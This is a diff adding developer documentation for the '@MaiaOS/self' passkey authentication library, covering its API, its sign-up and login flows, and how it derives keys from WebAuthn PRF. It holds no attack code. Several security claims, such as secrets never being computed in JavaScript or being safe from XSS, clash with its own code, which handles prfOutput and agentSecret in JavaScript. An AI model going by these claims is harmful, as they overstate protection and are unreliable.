+  - `state.syncing` (boolean) - Actively syncing?
+  - `state.error` (string | null) - Error message if any
+
+**Returns:** `Function` - Unsubscribe function
+
+**Example:**
+```javascript
+import { subscribeSyncState } from '@MaiaOS/self';
+
+const unsubscribe = subscribeSyncState((state) => {
+  console.log("Sync status:", state);
+  // { connected: true, syncing: true, error: null }
+});
+
+// Later: unsubscribe when done
+unsubscribe();
+```
+
+---
+
+## PRF Functions
+
+### `evaluatePRF(options)`
+
+Evaluate PRF with existing passkey.
+
+**Parameters:**
+- `options.salt` (Uint8Array) - Salt for PRF evaluation
+- `options.rpId` (string, optional) - Relying Party ID (defaults to current domain)
+
+**Returns:** `Promise<{prfOutput: Uint8Array, credentialId: ArrayBuffer}>`
+
+**Example:**
+```javascript
+import { evaluatePRF, stringToUint8Array } from '@MaiaOS/self';
+
+const { prfOutput, credentialId } = await evaluatePRF({
+  salt: stringToUint8Array("maia.city")
+});
+
+// prfOutput: 32 bytes of deterministic entropy
+// credentialId: Passkey credential ID
+```
+
+---
+
+### `createPasskeyWithPRF(options)`
+
+Create a new passkey with PRF enabled.
+
+**Parameters:**
+- `options.name` (string) - User-visible name
+- `options.userId` (Uint8Array) - User ID
+- `options.rpId` (string, optional) - Relying Party ID (defaults to current domain)
+- `options.salt` (Uint8Array, optional) - Evaluate PRF during creation
+
+**Returns:** `Promise<{credentialId: ArrayBuffer, response: Object, prfOutput?: Uint8Array}>`
+
+**Example:**
+```javascript
+import { createPasskeyWithPRF, stringToUint8Array } from '@MaiaOS/self';
+
+const { credentialId, prfOutput } = await createPasskeyWithPRF({
+  name: "maia",
+  userId: crypto.getRandomValues(new Uint8Array(32)),
+  salt: stringToUint8Array("maia.city")
+});
+
+// credentialId: Passkey credential ID
+// prfOutput: 32 bytes (if salt provided)
+```
+
+---
+
+### `getExistingPasskey(rpId)`
+
+Get an existing passkey (for sign-in).
+
+**Parameters:**
+- `rpId` (string, optional) - Relying Party ID (defaults to current domain)
+
+**Returns:** `Promise<{credentialId: ArrayBuffer, userId: Uint8Array}>`
+
+**Example:**
+```javascript
+import { getExistingPasskey } from '@MaiaOS/self';
+
+const { credentialId, userId } = await getExistingPasskey();
+
+// credentialId: Passkey credential ID
+// userId: User handle from passkey
+```
+
+---
+
+## Utility Functions
+
+### `arrayBufferToBase64(buffer)`
+
+Convert ArrayBuffer to base64 string.
+
+**Parameters:**
+- `buffer` (ArrayBuffer) - Buffer to convert
+
+**Returns:** `string` - Base64 string
+
+---
+
+### `base64ToArrayBuffer(base64)`
+
+Convert base64 string to ArrayBuffer.
+
+**Parameters:**
+- `base64` (string) - Base64 string
+
+**Returns:** `ArrayBuffer` - Buffer
+
+---
+
+### `stringToUint8Array(str)`
+
+Convert string to Uint8Array.
+
+**Parameters:**
+- `str` (string) - String to convert
+
+**Returns:** `Uint8Array` - Byte array
+
+---
+
+### `uint8ArrayToHex(arr)`
+
+Convert Uint8Array to hex string.
+
+**Parameters:**
+- `arr` (Uint8Array) - Byte array
+
+**Returns:** `string` - Hex string
+
+---
+
+### `isValidAccountID(accountID)`
+
+Validate accountID format (should start with "co_z").
+
+**Parameters:**
+- `accountID` (string) - Account ID to validate
+
+**Returns:** `boolean` - True if valid
+
+---
+
+## Storage Functions
+
+### `getStorage()`
+
+Get IndexedDB storage for CoValue persistence.
+
+**Returns:** `Promise<StorageAPI | undefined>` - Storage instance or undefined if unavailable
+
+**Example:**
+```javascript
+import { getStorage } from '@MaiaOS/self';
+
+const storage = await getStorage();
+
+if (storage) {
+  console.log("IndexedDB available for local caching");
+} else {
+  console.log("IndexedDB unavailable (incognito mode?)");
+}
+```
+
+---
+
+## Complete Integration Example
 
 ```javascript
-import { createMaiaOS, signInWithPasskey, isSignedIn } from '@MaiaOS/core';
+import { 
+  signUpWithPasskey, 
+  signInWithPasskey, 
+  subscribeSyncState,
+  requirePRFSupport 
+} from '@MaiaOS/self';
+import { createMaiaOS } from '@MaiaOS/kernel';
 
 async function init() {
-  if (!isSignedIn()) {
-    // Show sign-in button
-    document.getElementById("sign-in-btn").style.display = "block";
+  // Check PRF support first
+  try {
+    await requirePRFSupport();
+  } catch (error) {
+    showBrowserUpgradeMessage(error.message);
     return;
   }
   
-  // Auto sign-in
-  const { agentSecret } = await signInWithPasskey();
-  const o = await createMaiaOS({ agentSecret });
-  
-  renderApp(o);
+  // Show sign-in UI with both "Sign In" and "Register" buttons
+  renderSignInPrompt();
 }
 
-init();
+async function register() {
+  try {
+    // Create new account (1 biometric prompt)
+    const { node, account, accountID } = await signUpWithPasskey({
+      name: "maia",
+      salt: "maia.city"
+    });
+    
+    console.log("✅ Registered! Account ID:", accountID);
+    
+    // Subscribe to sync state
+    subscribeSyncState((state) => {
+      console.log("Sync:", state.connected ? "Online" : "Offline");
+    });
+    
+    // Create MaiaOS with node and account
+    const o = await createMaiaOS({ node, account, accountID });
+    
+    // Show app UI
+    renderApp(o);
+  } catch (error) {
+    console.error("Registration failed:", error.message);
+  }
+}
+
+async function signIn() {
+  try {
+    // Load existing account (1 biometric prompt - fast!)
+    const { node, account, accountID } = await signInWithPasskey({
+      salt: "maia.city"
+    });
+    
+    console.log("✅ Signed in! Account ID:", accountID);
+    
+    // Subscribe to sync state
+    subscribeSyncState((state) => {
+      console.log("Sync:", state.connected ? "Online" : "Offline");
+    });
+    
+    // Create MaiaOS with node and account
+    const o = await createMaiaOS({ node, account, accountID });
+    
+    // Show app UI
+    renderApp(o);
+  } catch (error) {
+    console.error("Sign in failed:", error.message);
+    
+    // If no passkey found, suggest registration
+    if (error.message.includes("No passkey found")) {
+      console.log("No passkey found. Please register first.");
+    }
+  }
+}
 ```
 
-### Pattern 2: Silent Authentication
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [security-analysis.md](./security-analysis.md) - Security analysis
+- [auth-flows.md](./auth-flows.md) - Registration and login flows
+- [cryptography.md](./cryptography.md) - Bottom-up cryptography concepts
+
+---
+
+# MAIA SELF/AUTH FLOWS
+
+*Source: developers/01_maia-self/auth-flows.md*
+
+# Authentication Flows
+
+Complete documentation of registration and login flows in `@MaiaOS/self`.
+
+---
+
+## Overview
+
+`@MaiaOS/self` uses a **single-passkey flow** with deterministic account derivation. The key breakthrough: accountID can be computed **before** account creation, enabling a clean, elegant architecture.
+
+---
+
+## Registration Flow
+
+### The Breakthrough: Deterministic AccountID
+
+**Traditional approach:**
+- Create account → Get random accountID → Store in passkey
+- Requires 2 passkeys (temp + final) or storage
+
+**MaiaOS approach:**
+- Compute accountID deterministically → Create account → Verify match
+- Requires only 1 passkey (single-passkey flow!)
+
+**Why this works:**
+- Account headers have `createdAt: null` and `uniqueness: null` (no random fields!)
+- `accountID = shortHash(header)` is a **pure function** of agentSecret
+- Same agentSecret → Same accountID (always!)
+
+---
+
+### Step-by-Step Registration
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│ STEP 1: Create Passkey and Evaluate PRF                    │
+│                                                             │
+│ const { credentialId, prfOutput } = await                  │
+│   createPasskeyWithPRF({                                    │
+│     name: "maia",                                           │
+│     userId: randomBytes(32),                                │
+│     salt: stringToUint8Array("maia.city")                   │
+│   });                                                       │
+│                                                             │
+│ User sees: 1 biometric prompt                               │
+│ PRF evaluation happens in Secure Enclave/TPM!              │
+│ Returns: 32 bytes of deterministic entropy                  │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ STEP 2: ⚡ COMPUTE AccountID Deterministically              │
+│                                                             │
+│ const agentSecret = crypto.agentSecretFromSecretSeed(      │
+│   prfOutput                                                 │
+│ );                                                          │
+│                                                             │
+│ const accountHeader = accountHeaderForInitialAgentSecret(  │
+│   agentSecret, crypto                                       │
+│ );                                                          │
+│                                                             │
+│ const computedAccountID = idforHeader(                     │
+│   accountHeader, crypto                                     │
+│ );                                                          │
+│                                                             │
+│ // accountID computed BEFORE account creation!              │
+│ // header has createdAt: null, uniqueness: null            │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ STEP 3: Create Account (Verify AccountID Match)            │
+│                                                             │
+│ const result = await LocalNode.withNewlyCreatedAccount({   │
+│   crypto,                                                   │
+│   initialAgentSecret: agentSecret,                          │
+│   creationProps: { name: "maia" },                         │
+│   peers: [jazzSyncPeer],                                    │
+│   storage: indexedDBStorage                                 │
+│ });                                                         │
+│                                                             │
+│ // Verification                                             │
+│ if (result.accountID !== computedAccountID) {             │
+│   throw Error("AccountID mismatch!");                       │
+│ }                                                           │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ RESULT: Account Created & Synced!                           │
+│                                                             │
+│ • Passkey stores private key (hardware-protected)          │
+│ • IndexedDB stores CoValue data locally                    │
+│ • Jazz Cloud syncs account across devices                  │
+│ • NO localStorage usage (zero browser storage!)            │
+│                                                             │
+│ User can now use the app on this and other devices!        │
+└─────────────────────────────────────────────────────────────┘
+```
+
+---
+
+### Registration Code Example
 
 ```javascript
-async function silentAuth() {
+import { signUpWithPasskey } from '@MaiaOS/self';
+
+async function register() {
   try {
-    if (!isSignedIn()) {
-      // No active session
-      return null;
+    // Create new account (1 biometric prompt)
+    const { accountID, agentSecret, node, account } = await signUpWithPasskey({
+      name: "maia",
+      salt: "maia.city"
+    });
+    
+    console.log("✅ Registered! Account ID:", accountID);
+    console.log("⚠️  agentSecret is ephemeral - never store it!");
+    
+    // Use node and account for app initialization
+    return { node, account, accountID };
+  } catch (error) {
+    console.error("Registration failed:", error.message);
+    throw error;
+  }
+}
+```
+
+---
+
+## Login Flow
+
+### The Breakthrough: Re-Evaluate PRF
+
+**Traditional approach:**
+- Load accountID from storage → Load account
+- Requires storage (localStorage or server)
+
+**MaiaOS approach:**
+- Re-evaluate PRF → Compute accountID → Load account
+- Requires NO storage (everything computed on-demand!)
+
+**Why this works:**
+- PRF is deterministic (same passkey + salt → same output)
+- AccountID is deterministic (same agentSecret → same accountID)
+- Everything recomputed from passkey each time
+
+---
+
+### Step-by-Step Login
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│ STEP 1: Authenticate and Re-Evaluate PRF                   │
+│                                                             │
+│ const { prfOutput } = await evaluatePRF({                  │
+│   salt: stringToUint8Array("maia.city")                    │
+│ });                                                         │
+│                                                             │
+│ User sees: 1 biometric prompt                               │
+│ PRF evaluation happens in Secure Enclave/TPM!              │
+│ Returns: Same 32 bytes as registration (deterministic!)    │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ STEP 2: Derive AgentSecret                                  │
+│                                                             │
+│ const agentSecret = crypto.agentSecretFromSecretSeed(      │
+│   prfOutput                                                 │
+│ );                                                          │
+│                                                             │
+│ // Same prfOutput → Same agentSecret (deterministic!)       │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ STEP 3: ⚡ COMPUTE AccountID Deterministically              │
+│                                                             │
+│ const accountHeader = accountHeaderForInitialAgentSecret(  │
+│   agentSecret, crypto                                       │
+│ );                                                          │
+│                                                             │
+│ const accountID = idforHeader(                             │
+│   accountHeader, crypto                                     │
+│ );                                                          │
+│                                                             │
+│ // Same agentSecret → Same accountID (deterministic!)       │
+│ // NO storage needed - computed on the fly!                 │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ STEP 4: Load Account                                        │
+│                                                             │
+│ const node = await LocalNode.withLoadedAccount({           │
+│   accountID,         // Computed from PRF!                  │
+│   accountSecret: agentSecret,  // Derived from PRF!        │
+│   sessionID: crypto.newRandomSessionID(accountID),        │
+│   peers: [jazzSyncPeer],     // Jazz Cloud sync            │
+│   storage: indexedDBStorage  // Local cache                │
+│ });                                                         │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ RESULT: Logged In!                                          │
+│                                                             │
+│ • Account loaded from IndexedDB (if available)              │
+│ • Or fetched from Jazz Cloud (cross-device sync)            │
+│ • NO localStorage dependencies                              │
+│ • Only 1 biometric prompt (no PRF re-evaluation needed!)    │
+│                                                             │
+│ User can now access their data!                             │
+└─────────────────────────────────────────────────────────────┘
+```
+
+---
+
+### Login Code Example
+
+```javascript
+import { signInWithPasskey } from '@MaiaOS/self';
+
+async function login() {
+  try {
+    // Load existing account (1 biometric prompt - fast!)
+    const { accountID, agentSecret, node, account } = await signInWithPasskey({
+      salt: "maia.city"
+    });
+    
+    console.log("✅ Signed in! Account ID:", accountID);
+    console.log("⚠️  agentSecret is ephemeral - never store it!");
+    
+    // Use node and account for app initialization
+    return { node, account, accountID };
+  } catch (error) {
+    console.error("Sign in failed:", error.message);
+    
+    // If no passkey found, suggest registration
+    if (error.message.includes("No passkey found")) {
+      console.log("No passkey found. Please register first.");
     }
     
-    const { agentSecret } = await signInWithPasskey();
-    return await createMaiaOS({ agentSecret });
-  } catch (error) {
-    console.error("Silent auth failed:", error);
+    throw error;
+  }
+}
+```
+
+---
+
+## Cross-Device Flow
+
+### How Cross-Device Works
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│ Device A: Registration                                      │
+│                                                             │
+│ 1. Create passkey (stored in Secure Enclave)               │
+│ 2. Passkey syncs to iCloud/Google (automatic)              │
+│ 3. Account syncs to Jazz Cloud (automatic)                 │
+└─────────────────────────────────────────────────────────────┘
+                         ↓
+┌─────────────────────────────────────────────────────────────┐
+│ Device B: Login                                             │
+│                                                             │
+│ 1. Same passkey available (synced from iCloud/Google)        │
+│ 2. Re-evaluate PRF → Same prfOutput                         │
+│ 3. Compute accountID → Same accountID                       │
+│ 4. Load account from Jazz Cloud → Seamless access          │
+└─────────────────────────────────────────────────────────────┘
+```
+
+**Key Points:**
+- Passkeys sync automatically via iCloud/Google
+- Accounts sync automatically via Jazz Cloud
+- No manual migration needed
+- Same passkey + salt → same account (always!)
+
+---
+
+## Flow Comparison
+
+### Traditional Password Manager
+
+```
+Registration:
+1. User creates master password
+2. Password hashed → stored in vault
+3. Vault encrypted → stored on server
+4. User must remember password
+
+Login:
+1. User enters password
+2. Password verified → vault decrypted
+3. User accesses passwords
+
+Cross-Device:
+1. User enters password on new device
+2. Vault synced from server
+3. User accesses passwords
+```
+
+**Problems:**
+- Password can be stolen (phishing, keylogger)
+- Password can be forgotten (locked out)
+- Server breach risk (encrypted vaults stored)
+
+---
+
+### MaiaOS (Passkey-Based)
+
+```
+Registration:
+1. User creates passkey (biometric)
+2. PRF evaluated → agentSecret derived
+3. AccountID computed → account created
+4. No password to remember!
+
+Login:
+1. User authenticates with passkey (biometric)
+2. PRF re-evaluated → agentSecret derived
+3. AccountID computed → account loaded
+4. Only 1 biometric prompt!
+
+Cross-Device:
+1. Passkey synced (iCloud/Google)
+2. PRF re-evaluated → same agentSecret
+3. AccountID computed → same account
+4. Account synced (Jazz Cloud)
+```
+
+**Benefits:**
+- ✅ No password to steal (biometric only)
+- ✅ No password to forget (biometric always available)
+- ✅ Server breach safe (master secret never stored)
+
+---
+
+## Implementation Details
+
+### Registration Implementation
+
+```javascript
+// libs/maia-self/src/oSSI.js
+
+export async function signUpWithPasskey({ name = "maia", salt = "maia.city" } = {}) {
+  await requirePRFSupport();
+  
+  const saltBytes = stringToUint8Array(salt);
+  const crypto = await WasmCrypto.create();
+  
+  // STEP 1: Create passkey and evaluate PRF
+  const { credentialId, prfOutput } = await createPasskeyWithPRF({
+    name,
+    userId: globalThis.crypto.getRandomValues(new Uint8Array(32)),
+    salt: saltBytes,
+  });
+  
+  // STEP 2: Compute accountID deterministically
+  const agentSecret = crypto.agentSecretFromSecretSeed(prfOutput);
+  const accountHeader = accountHeaderForInitialAgentSecret(agentSecret, crypto);
+  const computedAccountID = idforHeader(accountHeader, crypto);
+  
+  // STEP 3: Create account
+  const storage = await getStorage();
+  const syncSetup = setupJazzSyncPeers(apiKey);
+  
+  const result = await LocalNode.withNewlyCreatedAccount({
+    crypto,
+    initialAgentSecret: agentSecret,
+    creationProps: { name },
+    peers: syncSetup.peers,
+    storage,
+  });
+  
+  // STEP 4: Verify accountID matches
+  if (result.accountID !== computedAccountID) {
+    throw Error("AccountID mismatch!");
+  }
+  
+  return { accountID: result.accountID, agentSecret, node: result.node, account };
+}
+```
+
+---
+
+### Login Implementation
+
+```javascript
+// libs/maia-self/src/oSSI.js
+
+export async function signInWithPasskey({ salt = "maia.city" } = {}) {
+  await requirePRFSupport();
+  
+  const saltBytes = stringToUint8Array(salt);
+  
+  // STEP 1: Re-evaluate PRF
+  const { prfOutput } = await evaluatePRF({ salt: saltBytes });
+  
+  // STEP 2: Derive agentSecret
+  const crypto = await WasmCrypto.create();
+  const agentSecret = crypto.agentSecretFromSecretSeed(prfOutput);
+  
+  // STEP 3: Compute accountID deterministically
+  const accountHeader = accountHeaderForInitialAgentSecret(agentSecret, crypto);
+  const accountID = idforHeader(accountHeader, crypto);
+  
+  // STEP 4: Load account
+  const storage = await getStorage();
+  const syncSetup = setupJazzSyncPeers(apiKey);
+  
+  const node = await LocalNode.withLoadedAccount({
+    accountID,
+    accountSecret: agentSecret,
+    crypto,
+    peers: syncSetup.peers,
+    storage,
+  });
+  
+  const account = node.expectCurrentAccount("signInWithPasskey");
+  
+  return { accountID: account.id, agentSecret, node, account };
+}
+```
+
+---
+
+## Key Insights
+
+### Why Deterministic AccountID Works
+
+**Account headers have NO random fields:**
+```javascript
+{
+  type: "comap",
+  ruleset: { type: "group", initialAdmin: agentID },
+  meta: { type: "account" },
+  createdAt: null,  // ← Not random!
+  uniqueness: null  // ← Not random!
+}
+```
+
+**Therefore:**
+- `accountID = shortHash(header)` is a **pure function**
+- Same agentSecret → Same header → Same accountID (always!)
+- Can compute accountID **before** account creation
+
+---
+
+### Why Single-Passkey Flow Works
+
+**Traditional approach:**
+- Need accountID to store in passkey
+- But accountID only known after account creation
+- Solution: Create temp passkey → Create account → Create final passkey (2 prompts)
+
+**MaiaOS approach:**
+- Compute accountID deterministically (before account creation!)
+- Create single passkey (1 prompt)
+- Create account (verify ID matches)
+
+**Result:** Cleaner architecture, better UX, same security!
+
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [security-analysis.md](./security-analysis.md) - Security analysis
+- [cryptography.md](./cryptography.md) - Bottom-up cryptography concepts
+- [api-reference.md](./api-reference.md) - API reference
+
+---
+
+# MAIA SELF/CRYPTOGRAPHY
+
+*Source: developers/01_maia-self/cryptography.md*
+
+# Bottom-Up Cryptography Concepts
+
+Understanding the cryptographic foundations of `@MaiaOS/self` from first principles.
+
+---
+
+## Overview
+
+This document explains the cryptography used in `@MaiaOS/self` from the ground up, starting with the most fundamental concepts and building to the complete system.
+
+---
+
+## Layer 1: PRF (Pseudo-Random Function)
+
+### What is a PRF?
+
+Think of a PRF like a **magic blender** that takes two ingredients and produces a unique, random-looking output:
+
+```
+PRF(passkey, salt) → 32 bytes of random-looking data
+```
+
+**Key Properties:**
+- **Deterministic:** Same inputs → same output (always!)
+- **Random-looking:** Output looks random (can't predict it)
+- **One-way:** Can't reverse it (can't get passkey from output)
+
+### WebAuthn PRF Extension
+
+**What it is:**
+- Hardware-backed PRF evaluation
+- Runs in Secure Enclave/TPM (hardware chip)
+- Cannot be extracted by software
+
+**Why it matters:**
+- Secrets never computed in JavaScript
+- Hardware isolation provides stronger security
+- Cannot be stolen by XSS attacks or malware
+
+### PRF Evaluation
+
+```javascript
+// Evaluate PRF with existing passkey
+const { prfOutput } = await evaluatePRF({
+  salt: stringToUint8Array("maia.city")
+});
+
+// prfOutput: 32 bytes of deterministic entropy
+// Same passkey + same salt → same prfOutput (always!)
+```
+
+**What happens:**
+1. Browser prompts for biometric (fingerprint/face)
+2. Secure Enclave evaluates PRF(passkey, salt)
+3. Returns 32-byte output (never leaves hardware during evaluation)
+4. Output used to derive secrets
+
+---
+
+## Layer 2: AgentSecret Derivation
+
+### What is AgentSecret?
+
+AgentSecret is the **master key** for your account. It's derived from the PRF output and used to:
+- Sign transactions (prove you authorized them)
+- Seal data (encrypt for specific groups)
+- Derive other secrets
+
+### Derivation Process
+
+```
+PRF Output (32 bytes)
+    ↓ crypto.agentSecretFromSecretSeed()
+AgentSecret
+    Format: "sealerSecret_z.../signerSecret_z..."
+```
+
+**Code:**
+```javascript
+const agentSecret = crypto.agentSecretFromSecretSeed(prfOutput);
+
+// agentSecret contains:
+// - sealerSecret: For encrypting data
+// - signerSecret: For signing transactions
+```
+
+**Key Properties:**
+- **Deterministic:** Same PRF output → same AgentSecret (always!)
+- **Ephemeral:** Never stored, derived on-demand
+- **Master key:** Used to derive all other secrets
+
+---
+
+## Layer 3: AgentID Derivation
+
+### What is AgentID?
+
+AgentID is your **public cryptographic identity**. It's derived from AgentSecret and contains:
+- Public signing key (for verifying signatures)
+- Public sealing key (for encrypting data to you)
+
+### Derivation Process
+
+```
+AgentSecret
+    ↓ crypto.getAgentID()
+AgentID
+    Format: "sealer_z.../signer_z..."
+```
+
+**Code:**
+```javascript
+const agentID = crypto.getAgentID(agentSecret);
+
+// agentID contains:
+// - sealer: Public encryption key
+// - signer: Public signing key
+```
+
+**Key Properties:**
+- **Public:** Can be shared (it's your identity)
+- **Deterministic:** Same AgentSecret → same AgentID (always!)
+- **Cryptographic identity:** Used to identify you in transactions
+
+---
+
+## Layer 4: AccountID Derivation
+
+### What is AccountID?
+
+AccountID is your **account identifier**. It's a deterministic hash of the account header, which contains:
+- Account type (comap)
+- Ruleset (group with you as admin)
+- Metadata (account type)
+- **NO random fields!** (createdAt: null, uniqueness: null)
+
+### Derivation Process
+
+```
+AgentSecret
+    ↓ accountHeaderForInitialAgentSecret()
+Account Header
+    {
+      type: "comap",
+      ruleset: { type: "group", initialAdmin: agentID },
+      meta: { type: "account" },
+      createdAt: null,  // ← Not random!
+      uniqueness: null  // ← Not random!
+    }
+    ↓ idforHeader()
+AccountID
+    Format: "co_z..."
+```
+
+**Code:**
+```javascript
+const accountHeader = accountHeaderForInitialAgentSecret(agentSecret, crypto);
+const accountID = idforHeader(accountHeader, crypto);
+
+// accountID: "co_z..." (public identifier)
+// Same agentSecret → Same accountID (always!)
+```
+
+**Key Properties:**
+- **Deterministic:** Same AgentSecret → same AccountID (always!)
+- **Public:** Can be shared (it's your account identifier)
+- **Computable before creation:** No random fields means we can compute it before creating the account!
+
+---
+
+## The Complete Chain
+
+### From PRF to AccountID
+
+```
+┌─────────────────────────────────────────┐
+│ Layer 1: PRF Output (32 bytes)         │
+│ Source: WebAuthn PRF in Secure Enclave │
+│ Storage: NEVER stored                   │
+└─────────────────────────────────────────┘
+              ↓ crypto.agentSecretFromSecretSeed()
+┌─────────────────────────────────────────┐
+│ Layer 2: AgentSecret                    │
+│ Format: "sealerSecret_z.../signer..."   │
+│ Storage: NEVER stored, ephemeral        │
+└─────────────────────────────────────────┘
+              ↓ crypto.getAgentID()
+┌─────────────────────────────────────────┐
+│ Layer 3: AgentID                         │
+│ Format: "sealer_z.../signer_z..."       │
+│ Storage: Public (can be shared)         │
+└─────────────────────────────────────────┘
+              ↓ accountHeaderForInitialAgentSecret() + idforHeader()
+┌─────────────────────────────────────────┐
+│ Layer 4: AccountID                       │
+│ Format: "co_z..."                        │
+│ Storage: Public (can be stored)          │
+└─────────────────────────────────────────┘
+```
+
+### Deterministic Property
+
+**The key insight:** Every step is deterministic!
+
+```
+Same passkey + same salt
+    ↓
+Same PRF output
+    ↓
+Same AgentSecret
+    ↓
+Same AgentID
+    ↓
+Same Account Header (no random fields!)
+    ↓
+Same AccountID
+```
+
+**Why this matters:**
+- Can compute AccountID **before** account creation
+- Same passkey + salt → same account (always!)
+- Cross-device recovery without storage
+- No "forgot password" flow needed
+
+---
+
+## Cryptographic Primitives
+
+### BLAKE3 Hash Function
+
+**What it is:**
+- Fast, secure hash function
+- Used for deriving secrets from PRF output
+
+**Usage:**
+```javascript
+// Internal to crypto.agentSecretFromSecretSeed()
+const sealerSecret = BLAKE3(prfOutput, context="seal");
+const signerSecret = BLAKE3(prfOutput, context="sign");
+```
+
+**Properties:**
+- **Deterministic:** Same input → same output
+- **One-way:** Can't reverse it
+- **Fast:** Optimized for performance
+
+---
+
+### Ed25519 Signing
+
+**What it is:**
+- Elliptic curve signature scheme
+- Used for signing transactions
+
+**Usage:**
+```javascript
+// Internal to cojson
+const signature = ed25519.sign(message, signerSecret);
+const isValid = ed25519.verify(message, signature, signerPublicKey);
+```
+
+**Properties:**
+- **Fast:** Efficient signing and verification
+- **Secure:** Based on elliptic curve cryptography
+- **Deterministic:** Same message + secret → same signature
+
+---
+
+### X25519 Key Exchange
+
+**What it is:**
+- Elliptic curve key exchange
+- Used for encrypting data (sealing)
+
+**Usage:**
+```javascript
+// Internal to cojson
+const sharedSecret = x25519.computeSharedSecret(sealerSecret, recipientPublicKey);
+const encrypted = encrypt(data, sharedSecret);
+```
+
+**Properties:**
+- **Fast:** Efficient key exchange
+- **Secure:** Based on elliptic curve cryptography
+- **Forward secret:** New keys for each encryption
+
+---
+
+## Security Properties
+
+### What Makes It Secure
+
+#### 1. Hardware-Backed Secrets
+
+**PRF evaluation in Secure Enclave/TPM:**
+- Secrets never computed in JavaScript
+- Hardware isolation protects against software attacks
+- Cannot be extracted by XSS or malware
+
+#### 2. Deterministic Derivation
+
+**Same inputs → same outputs:**
+- No randomness in account headers
+- AccountID computable before creation
+- Cross-device recovery without storage
+
+#### 3. Ephemeral Secrets
+
+**Secrets never stored:**
+- AgentSecret derived on-demand
+- Wiped after use
+- Cannot be stolen from storage
+
+#### 4. Zero-Knowledge Sync
+
+**Server cannot decrypt:**
+- All data encrypted with user's keys
+- Server stores encrypted blobs only
+- User controls encryption keys
+
+---
+
+## Attack Resistance
+
+### What Attacks Are Prevented
+
+#### 1. XSS (Cross-Site Scripting)
+
+**Attack:** Malicious code steals secrets from browser storage.
+
+**Prevention:**
+- ✅ No secrets in browser storage
+- ✅ PRF evaluation in hardware (XSS can't access)
+- ✅ Secrets derived on-demand (nothing to steal)
+
+#### 2. Keylogger
+
+**Attack:** Malware records keyboard input to steal password.
+
+**Prevention:**
+- ✅ No keyboard input (biometric only)
+- ✅ Keylogger cannot capture fingerprint/face
+- ✅ PRF evaluation in hardware (keylogger can't see)
+
+#### 3. Memory Dump
+
+**Attack:** Malware reads computer memory to find secrets.
+
+**Prevention:**
+- ✅ Secrets cleared immediately after use
+- ✅ Ephemeral secrets (derived on-demand)
+- ✅ PRF evaluation in hardware (not in RAM)
+
+#### 4. Server Breach
+
+**Attack:** Hackers break into sync server.
+
+**Prevention:**
+- ✅ Master secret never stored anywhere
+- ✅ Server stores encrypted blobs only
+- ✅ User controls encryption keys
+
+---
+
+## Implementation Details
+
+### PRF Evaluation
+
+```javascript
+// libs/maia-self/src/prf-evaluator.js
+
+export async function evaluatePRF({ salt, rpId = window.location.hostname }) {
+  const assertion = await navigator.credentials.get({
+    publicKey: {
+      challenge: crypto.getRandomValues(new Uint8Array(32)),
+      rpId: rpId,
+      userVerification: 'required',
+      authenticatorAttachment: 'platform',
+      hints: ['client-device'],
+      extensions: {
+        prf: {
+          eval: {
+            first: salt, // The salt we want to evaluate
+          }
+        }
+      }
+    },
+    mediation: 'optional',
+  });
+
+  const prfResults = assertion.getClientExtensionResults()?.prf;
+  return {
+    prfOutput: new Uint8Array(prfResults.results.first),
+    credentialId: assertion.rawId,
+  };
+}
+```
+
+### AgentSecret Derivation
+
+```javascript
+// Internal to cojson/crypto
+export function agentSecretFromSecretSeed(secretSeed: Uint8Array): AgentSecret {
+  const sealerSecret = blake3(secretSeed, { context: "seal" });
+  const signerSecret = blake3(secretSeed, { context: "sign" });
+  
+  return {
+    sealerSecret: `sealerSecret_z${encode(sealerSecret)}`,
+    signerSecret: `signerSecret_z${encode(signerSecret)}`,
+  };
+}
+```
+
+### AccountID Derivation
+
+```javascript
+// Internal to cojson
+export function accountHeaderForInitialAgentSecret(
+  agentSecret: AgentSecret,
+  crypto: CryptoProvider
+): AccountHeader {
+  const agentID = crypto.getAgentID(agentSecret);
+  
+  return {
+    type: "comap",
+    ruleset: {
+      type: "group",
+      initialAdmin: agentID,
+    },
+    meta: {
+      type: "account",
+    },
+    createdAt: null,  // ← Not random!
+    uniqueness: null,  // ← Not random!
+  };
+}
+
+export function idforHeader(header: AccountHeader, crypto: CryptoProvider): CoID {
+  const hash = crypto.shortHash(header);
+  return `co_z${encode(hash)}`;
+}
+```
+
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [security-analysis.md](./security-analysis.md) - Security analysis
+- [auth-flows.md](./auth-flows.md) - Registration and login flows
+- [api-reference.md](./api-reference.md) - API reference
+
+---
+
+# MAIA SELF/README
+
+*Source: developers/01_maia-self/README.md*
+
+# maia-self: Self-Sovereign Identity
+
+## Overview
+
+The `@MaiaOS/self` package provides hardware-backed, zero-storage authentication for MaiaOS using WebAuthn PRF (Pseudo-Random Function). Think of it as your digital identity card that lives in hardware and never stores secrets in the browser.
+
+**What it is:**
+- ✅ **Hardware-backed authentication** - Uses Secure Enclave/TPM for secret derivation
+- ✅ **Zero secret storage** - All secrets derived on-demand (NO localStorage!)
+- ✅ **Deterministic accounts** - Same passkey + salt = same account (always!)
+- ✅ **Self-sovereign** - You control your identity, no server-side account database
+- ✅ **Cross-device sync** - Passkeys sync via iCloud/Google, accounts via Jazz Cloud
+
+**What it isn't:**
+- ❌ **Not password-based** - Uses biometrics (fingerprint/face) only
+- ❌ **Not server-dependent** - No server-side account storage required
+- ❌ **Not localStorage-dependent** - Zero secrets in browser storage
+
+---
+
+## The Simple Version
+
+Think of `maia-self` like a magic fingerprint scanner:
+
+**Traditional password manager:**
+- You remember a master password
